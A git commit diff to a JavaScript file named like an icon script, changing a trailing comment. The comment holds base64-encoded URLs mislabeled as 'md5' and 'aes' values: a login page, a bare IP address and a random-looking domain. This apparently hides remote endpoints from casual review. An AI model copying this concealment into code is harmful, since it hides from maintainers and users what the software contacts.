ad366fa970a01d2862f323cb94eaf645a8f2e5e3
caocaodage <caocaodajun@gmail.com>
2023-01-29 16:44:45 +0800

    init

--- js/icon_onji7i.js
+++ js/icon_onji7i.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly93d3cuc3ZubW5iMWQuY29tLyMvbG9naW4vbG9naW4=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cDovL3d3dy5na2Foc2RhbGtqdy5jb20v**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
